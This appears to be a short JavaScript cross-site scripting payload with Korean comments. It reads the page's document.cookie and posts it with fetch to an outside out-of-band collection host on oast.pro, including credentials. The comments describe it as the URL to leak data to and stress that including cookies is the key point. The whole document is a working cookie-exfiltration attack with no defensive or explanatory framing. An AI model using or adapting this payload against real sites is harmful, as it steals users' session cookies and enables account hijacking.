(async () => {
  // 유출할 URL (RequestBin 등)
  const url = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro";

  // FormData를 사용해 실제 브라우저의 POST 형태 흉내
  const data = new FormData();
  data.append("leak", document.cookie);

  // fetch를 사용하면서 실제 브라우저가 보낼법한 헤더 포함
  await fetch(url, {
    method: "POST",
    mode: "cors",
    credentials: "include", // ✅ 쿠키 포함 핵심!
    headers: {
      // 실제 브라우저처럼 Accept 헤더 등 구성
      "Accept": "*/*",
    },
    body: data
  });
})();
